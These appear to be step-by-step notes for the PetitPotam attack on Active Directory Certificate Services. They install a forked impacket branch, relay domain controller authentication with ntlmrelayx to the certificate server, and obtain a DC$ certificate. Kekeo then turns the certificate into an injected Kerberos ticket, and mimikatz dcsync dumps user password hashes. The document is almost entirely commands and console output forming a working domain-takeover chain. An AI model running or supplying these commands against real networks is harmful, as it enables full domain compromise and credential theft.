install special ntlmrelayx 

	mkdir dev  
	cd dev  
	git clone https://github.com/ExAndroidDev/impacket.git  
	cd impacket  
	git switch ntlmrelayx-adcs-attack  
	sudo python3 ./setup.py install
	
Start ntlmrelayx server
You need to detect cert server ip

	┌──(kali㉿kali)-[~/Desktop/petitpotam/impacket/examples]
	└─$ sudo python3 ntlmrelayx.py -debug -smb2support --target http://<cert server>/certsrv/certfnsh.asp --adcs --template KerberosAuthentication
	Impacket v0.9.24.dev1+20210815.200803.5fd22878 - Copyright 2021 SecureAuth Corporation

	[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20210815.200803.5fd22878-py3.9.egg/impacket
	[*] Protocol Client MSSQL loaded..
	[*] Protocol Client LDAP loaded..
	[*] Protocol Client LDAPS loaded..
	[*] Protocol Client RPC loaded..
	[*] Protocol Client HTTP loaded..
	[*] Protocol Client HTTPS loaded..
	[*] Protocol Client IMAP loaded..
	[*] Protocol Client IMAPS loaded..
	[*] Protocol Client SMTP loaded..
	[*] Protocol Client SMB loaded..
	[*] Protocol Client DCSYNC loaded..
	[+] Protocol Attack DCSYNC loaded..
	[+] Protocol Attack LDAP loaded..
	[+] Protocol Attack LDAPS loaded..
	[+] Protocol Attack MSSQL loaded..
	[+] Protocol Attack IMAP loaded..
	[+] Protocol Attack IMAPS loaded..
	[+] Protocol Attack RPC loaded..
	[+] Protocol Attack HTTP loaded..
	[+] Protocol Attack HTTPS loaded..
	[+] Protocol Attack SMB loaded..
	[*] Running in relay mode to single host
	[*] Setting up SMB Server

	[*] Setting up HTTP Server
	[*] Setting up WCF Server
	[*] Servers started, waiting for connections
	
	
	
initiate Petitpotam attack


	┌──(kali㉿kali)-[~/Desktop/petitpotam/PetitPotam]
	└─$ python3 PetitPotam.py <listen server> <dc ip>                                                                                                       


				  ___            _        _      _        ___            _                     
				 | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
				 |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
				_|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
			  _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
			  "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 

				  PoC to elicit machine account authentication via some MS-EFSRPC functions
										  by topotam (@topotam77)

						 Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



	[-] Connecting to ncacn_np:10.13.8.1[\PIPE\lsarpc]
	[+] Connected!
	[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
	[+] Successfully bound!
	[-] Sending EfsRpcOpenFileRaw!
	.
	.



check back ntlmrelayx server


	[*] Setting up HTTP Server
	[*] Setting up WCF Server
	[*] Servers started, waiting for connections
	[*] SMBD-Thread-4: Connection from <domain name>/DC$@<DC ip> controlled, attacking target http://<Cert server>
	[*] HTTP server returned error code 200, treating as a successful login
	[*] Authenticating against http://<Cert server> as <domain name>/DC$ SUCCEED
	[*] SMBD-Thread-4: Connection from <domain name>/DC$@<DC ip> controlled, attacking target http://<Cert server>
	[*] HTTP server returned error code 200, treating as a successful login
	[*] Authenticating against http://<Cert server> as <domain name>/DC$ SUCCEED
	[*] SMBD-Thread-4: Connection from <domain name>/DC$@<DC ip> controlled, attacking target http://<Cert server>
	[*] HTTP server returned error code 200, treating as a successful login
	[*] Authenticating against http://<Cert server> as <domain name>/DC$ SUCCEED
	[*] SMBD-Thread-4: Connection from <domain name>/DC$@<DC ip> controlled, attacking target http://<Cert server>
	[*] HTTP server returned error code 200, treating as a successful login
	[*] Authenticating against http://<Cert server> as <domain name>/DC$ SUCCEED
	[*] SMBD-Thread-4: Connection from <domain name>/DC$@<DC ip> controlled, attacking target http://<Cert server>
	[*] HTTP server returned error code 200, treating as a successful login
	[*] Authenticating against http://<Cert server> as <domain name>/DC$ SUCCEED
	[*] Generating CSR...
	[*] CSR generated!
	[*] Getting certificate...
	[*] GOT CERTIFICATE!
	[*] Base64 certificate of user DC$: 
	MIIShQIBAzCCEk8GCSqGSIb3DQEHAaCCEkAEghI8MIISODCCCGcGCSqGSIb3DQEHBqCCCFgwgghUAgEAMIIITQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQI1bw80uoT1OECAggAgIIIIGPwCalx5il1r7k/....cCgQIixsKtYEYD3M=
	[*] Skipping user DC$ since attack was already performed
	[*] Skipping user DC$ since attack was already performed
	[*] Skipping user DC$ since attack was already performed
	[*] Skipping user DC$ since attack was already performed
	[*] SMBD-Thread-4: Connection from <domain name>/DC$@<DC ip> controlled, attacking target http://<Cert server>
	[*] HTTP server returned error code 200, treating as a successful login
	[*] Authenticating against http://<Cert server> as <domain name>/DC$ SUCCEED
	[*] Skipping user DC$ since attack was already performed
	[*] SMBD-Thread-4: Connection from <domain name>/DC$@<DC ip> controlled, attacking target http://<Cert server>
	
	
	
Start kekeo and craft a ticket

	kekeo\x64> .\kekeo.exe

	  ___ _    kekeo 2.1 (x64) built on Jul 23 2021 20:56:45
	 /   ('>-  "A La Vie, A L'Amour"
	 | K  |    /* * *
	 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
	  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)
												 with 10 modules * * */

	kekeo # base64
	isBase64InterceptInput  is false
	isBase64InterceptOutput is false

	kekeo # base64 /input:on
	isBase64InterceptInput  is true
	isBase64InterceptOutput is false

	kekeo # tgt::ask /pfx:MIIShQIBAzCCEk8GCSq...QcCgQIixsKtYEYD3M= /user:DC$ /domain:<domain name> /ptt
	Realm        : <domain name>(<domain name>)
	User         : <DC>$ (<DC>$)
	CName        : <DC>$        [KRB_NT_PRINCIPAL (1)]
	SName        : krbtgt/<domain name>  [KRB_NT_SRV_INST (2)]
	Need PAC     : Yes
	Auth mode    : RSA
	[kdc] name: ..... (auto)
	[kdc] addr: ... (auto)
	 > krbtgt/<Domain name> : OK!

	kekeo #
	

Get user hash with mimikatz

	x64> .\mimikatz.exe

	  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
	 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
	 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
	  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

	mimikatz # privilege::debug
	Privilege '20' OK

	mimikatz # lsadump::dcsync /domain:<domain> /user:<user>